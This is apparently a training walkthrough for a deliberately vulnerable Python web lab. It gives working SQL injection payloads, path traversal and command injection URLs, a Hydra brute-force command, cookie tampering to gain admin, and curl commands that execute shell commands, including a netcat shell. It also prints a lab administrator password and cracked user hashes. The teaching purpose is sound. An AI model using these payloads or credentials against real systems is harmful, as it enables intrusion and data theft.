# Python SafeSite Guide

## Windows

- Region: `us-east-1`
- AMI name: `SecLabClient`
- Description: This is the Windows client with tools for the Python_SafeSite Security Workshop
- Administrator Password: `mBp4t;Jvg6!dskzt3DCHa@w7H?l5.?VE`
- AMI id: `ami-01127273b979fe92b`

## Linux

- Region: `us-east-1`
- AMI name: `SecLabServer`
- Description: This is the Linux server with the vulnerable site for the Python_SafeSite Security Workshop
- AMI id: `ami-01127273b979fe92b`

## Falhas e Ataques

### Home page: SQL Injection

By placing a double quotation mark (") in the search field, the site breaks. This shows that the site is vulnerable to SQL Injection attacks. An aggravating factor is that the developer left the Debug page enabled, showing details of the error and even the engine (SQLite3). With SQL information it is possible to compose an attack that is added to the "where" clause:

- Original:

  - `SELECT * FROM posts WHERE Content LIKE "%"%";`

- Poisoned:

  - `SELECT * FROM posts WHERE Content LIKE "%X" union select 1, 2 --%";`

    - `X" union select 1, 2 --`
    - `X" union select name, sql from sqlite_master where type='table' --`
    - `X" union select name || ': ' || card, password from secrets --`
    - `X" union select login || ': ' || email, password from logins --`

We have the hashes. Break them in [https://crackstation.net/](https://crackstation.net/):

084e0343a0486ff05530df6c705c8bb4: guest@guest
084e0343a0486ff05530df6c705c8bb4

21232f297a57a5a743894a0e4a801fc3: admin@admin
0192023a7bbd73250516f069df18b500

263bce650e68ab4e23f28263760b9fa5: maria@gmail.com
3a1f9e20f1beac9b81a1e18e08b7f442

dc599a9972fde3045dab59dbd1ae170b: carlos@hotmail.com
a07bda8fd5e39462b4c3d860a36f6b4d

| Hash                             | Tipo | Senha       |
| -------------------------------- | ---- | ----------- |
| 084e0343a0486ff05530df6c705c8bb4 | md5  | guest       |
| 0192023a7bbd73250516f069df18b500 | md5  | admin123    |
| 3a1f9e20f1beac9b81a1e18e08b7f442 | md5  | unicornio   |
| a07bda8fd5e39462b4c3d860a36f6b4d | md5  | corinthians |

### About us page: Path Traversal, Remote Command Execution

The About Us page clearly displays the contents of text files that are on the server. When you click on one of them, the URL looks like this:

[http://0.0.0.0:8000/about?doc=termo_de_uso](http://0.0.0.0:8000/about?doc=termo_de_uso)

Let's explore:

- `?doc=x`: blank
- `?doc=/etc/passwd`: blank

Probably not see anything because this field receives the file name and does prepend a path and append an extension. Therefore, term_user should become something like /folder/user.txt. If this is true, we can test with relative directories + null bytes and also with multiple file names.

- [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%00)  Breaks with null byte.
- [http://0.0.0.0:8000/about?doc=/etc/hostname /etc/fstab /etc/passwd /etc/mtab /etc/hosts](http://0.0.0.0:8000/about?doc=/etc/hostname%20/etc/fstab%20/etc/passwd%20/etc/mtab%20/etc/hosts) displays all files but the first and the last.
- Does it in this context pass the path to the shell? If so, we can try to embed and execute commands ... [http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x](http://0.0.0.0:8000/about?doc=../../../../../etc/passwd%20$(echo%20/etc/hosts)%20x). Oh, dear! Game over.

### Contact us: CSRF + XSS (Firefox)

These XSS attacks do not work in Chrome.

In the first form you can run an XSS, but it is not persisted.

In the second, however, it is persisted but not executed.

To make the attack, the victim has to click on a link made to steal the session or capture the browser, with software such as Beef, for example.

### Sign up: XSS, File Upload

When you create a user, you can upload any file other than a photo to the server. For a PHP site, for example, this file may be a shell that allows remote access to the server.

### Restrict area: HTTP Brute Force

With THC-Hydra, Burp Suite or OWASP ZAP you can easily crack passwords, as there is no time limiter after wrong attempts.

```
hydra -V -s 8000 \
    -l admin -P /opt/wordlists/common_it_passwords.txt \
    0.0.0.0 \
    http-post-form \
    '/login:login=^USER^&senha=^PASS^:Wrong credentials!'
```

### Profile: HTTP Brute Force

Same as the previous item.

### Global: Cookie Tampering (or Poisoning)

When creating a test user named **cleber** with password **12345**, the following cookies were set after login:

- pyverysafeid: 5c675a11f4a8474c3d75ff158570850a (this is cleber in MD5)
- pyverysafelogin: ee11cbb19052e40b07aac0ca060c23ee (this is the word "user")

If the hash is the word user, what happens if I switch to admin in MD5?

21232f297a57a5a743894a0e4a801fc3 -> admin

By updating the cookie and refreshing, session privileges are instantly increased!

### Global: Directory Search

Since there is no feature that prevents multiple sequential requests, tools such as DIRB, Nikto and ZAP can fuzzy or do list attacks to find hidden directories.

`dirb http://0.0.0.0:8000/`

Found `/status` hidden.

### Status: Form Tampering (or Poisoning)

The `/status` directory only allows the execution of certain commands, and only for the admin user. This restrictions are client-side, so they can be bypassed by changing parameters in the request, so that commands are sent directly to the server.

```
curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
    'http://0.0.0.0:8000/status' \
    -X POST \
    --data 'cmd=env'
```

To raise a reverse shell if the server has Netcat installed:

```
curl --cookie 'pyverysafelogin=21232f297a57a5a743894a0e4a801fc3' \
    'http://0.0.0.0:8000/status' \
    -X POST \
    --data 'cmd=nc -lvp 8443 -e /bin/bash'
```

There are much more breaches. Go explore and have fun!
